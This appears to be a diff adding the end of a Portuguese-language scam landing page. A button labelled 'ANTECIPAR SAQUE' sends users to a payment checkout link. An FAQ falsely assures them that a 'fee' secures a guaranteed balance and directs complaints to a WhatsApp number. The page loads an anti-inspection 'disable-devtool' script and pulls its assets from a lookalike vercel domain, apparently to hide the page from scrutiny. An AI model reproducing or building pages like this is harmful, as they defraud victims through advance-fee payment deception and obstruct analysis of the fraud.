+                          <a href="https://www.pagamentos-seguro.link/checkout/b2f5e807-1c32-4b0c-994a-0c9b3cb47ddb" class="botao-comprar" id="B1" style="background-color: #FF0150; border-radius: 20px; border: none; padding: 10px 20px; font-size: 26px; font-weight: bold; color: #FFFFFF; cursor: pointer; text-decoration: none;">
+                            ANTECIPAR SAQUE!
+                          </a>
+                        </div>
+                        <section class="faq" style="
+                        color: #ffffff;
+                        font-size: 14px;
+                        font-weight: bold;
+                        padding: 4px 18px;
+                        border-radius: 10px;
+                        text-align: center;
+                        margin-top: 20px;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        flex-direction: column;
+                      ">
+                          <h2>Dúvidas Frequentes</h2>
+                          <details>
+                            <summary>Por que pagar essa taxa?</summary>
+                            <p>A taxa é necessária para garantir a segurança da transação e evitar fraudes.</p>
+                          </details>
+                          <details>
+                            <summary>O que acontece após o pagamento?</summary>
+                            <p>O saldo será liberado automaticamente para a conta utilizada no pagamento.</p>
+                          </details>
+                          <details>
+                            <summary>O saldo é garantido?</summary>
+                            <p>Sim, garantimos 100% das transações em nossa plataforma com segurança total.</p>
+                          </details>
+                          <details>
+                            <summary>Meu saque não caiu, o que faço?</summary>
+                            <p>Se o seu saque não foi processado, entre em contato conosco imediatamente pelo telefone
+                              <strong>WhatsApp</strong> para que possamos verificar e resolver o problema o mais rápido possível: <a href="https://wa.me/5516999045107?text=Oi!%20Preciso%20de%20ajuda%20com%20meu%20saque%20ou%20saldo" target="_blank">Clique aqui para falar no WhatsApp</a>.
+                            </p>
+                          </details>
+                          <details>
+                            <summary>Como posso entrar em contato com vocês?</summary>
+                            <p>Basta nos chamar no WhatsApp através deste link: <a href="https://wa.me/5516999045107?text=Oi!%20Preciso%20de%20uma%20m%C3%A3ozinha%20para" target="_blank">Clique aqui para falar no WhatsApp</a>.</p>
+                          </details>
+                
+                        </section>
+                      </div>
+                      <script src="https://offeersegurooo.vercel.app/up04/antecipaco/disable-devtool.html" disable-devtool-auto=""></script>
+					<script type="text/javascript">
+				const lazyloadRunObserver = () => {
+					const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` );
+					const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => {
+						entries.forEach( ( entry ) => {
+							if ( entry.isIntersecting ) {
+								let lazyloadBackground = entry.target;
+								if( lazyloadBackground ) {
+									lazyloadBackground.classList.add( 'e-lazyloaded' );
+								}
+								lazyloadBackgroundObserver.unobserve( entry.target );
+							}
+						});
+					}, { rootMargin: '200px 0px 200px 0px' } );
+					lazyloadBackgrounds.forEach( ( lazyloadBackground ) => {
+						lazyloadBackgroundObserver.observe( lazyloadBackground );
+					} );
+				};
+				const events = [
+					'DOMContentLoaded',
+					'elementor/lazyload/observe',
+				];
+				events.forEach( ( event ) => {
+					document.addEventListener( event, lazyloadRunObserver );
+				} );
+			</script>
+			<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/hello-frontend.min.js" id="hello-theme-frontend-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/jquery-numerator.min.js" id="jquery-numerator-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/jquery.sticky.min.js" id="e-sticky-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/webpack-pro.runtime.min.js" id="elementor-pro-webpack-runtime-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/webpack.runtime.min.js" id="elementor-webpack-runtime-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/frontend-modules.min.js" id="elementor-frontend-modules-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/hooks.min.js" id="wp-hooks-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/i18n.min.js" id="wp-i18n-js"></script>
+<script id="wp-i18n-js-after">
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+</script>
+<script id="elementor-pro-frontend-js-before">
+var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/portalglobosmundo.online\/wp-admin\/admin-ajax.php","nonce":"7d56d9482b","urls":{"assets":"https:\/\/portalglobosmundo.online\/wp-content\/plugins\/pro-elements\/assets\/","rest":"https:\/\/portalglobosmundo.online\/wp-json\/"},"settings":{"lazy_load_background_images":true},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"pt_BR","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/portalglobosmundo.online\/wp-content\/plugins\/pro-elements\/modules\/lottie\/assets\/animations\/default.json"}};
+</script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/frontend.min.js" id="elementor-pro-frontend-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/core.min.js" id="jquery-ui-core-js"></script>
+<script id="elementor-frontend-js-before">
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Compartilhar no Facebook","shareOnTwitter":"Compartilhar no Twitter","pinIt":"Fixar","download":"Baixar","downloadImage":"Baixar imagem","fullscreen":"Tela cheia","zoom":"Zoom","share":"Compartilhar","playVideo":"Reproduzir v\u00eddeo","previous":"Anterior","next":"Pr\u00f3ximo","close":"Fechar","a11yCarouselPrevSlideMessage":"Slide anterior","a11yCarouselNextSlideMessage":"Pr\u00f3ximo slide","a11yCarouselFirstSlideMessage":"Este \u00e9 o primeiro slide","a11yCarouselLastSlideMessage":"Este \u00e9 o \u00faltimo slide","a11yCarouselPaginationBulletMessage":"Ir para o slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Dispositivos m\u00f3veis no modo retrato","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Dispositivos m\u00f3veis no modo paisagem","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet no modo retrato","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet no modo paisagem","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Notebook","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Tela ampla (widescreen)","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.26.0","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_onboarding":true,"e_css_smooth_scroll":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"home_screen":true,"nested-elements":true,"editor_v2":true,"e_element_cache":true,"link-in-bio":true,"floating-buttons":true,"display-conditions":true,"form-submissions":true},"urls":{"assets":"https:\/\/portalglobosmundo.online\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/portalglobosmundo.online\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/portalglobosmundo.online\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"77705fa138"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"title","hello_footer_logo_type":"logo"},"post":{"id":2826,"title":"IOF%20%E2%80%93%20Perguntas","excerpt":"","featuredImage":false}};
+</script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/frontend.min_1.js" id="elementor-frontend-js"></script>
+<script src="https://offeersegurooo.vercel.app/up04/antecipaco/js/elements-handlers.min.js" id="pro-elements-handlers-js"></script>
+
+
+</div></div></div></div></div></div></body></html><!-- Page cached by LiteSpeed Cache 6.5.4 on 2025-01-02 18:50:04 -->
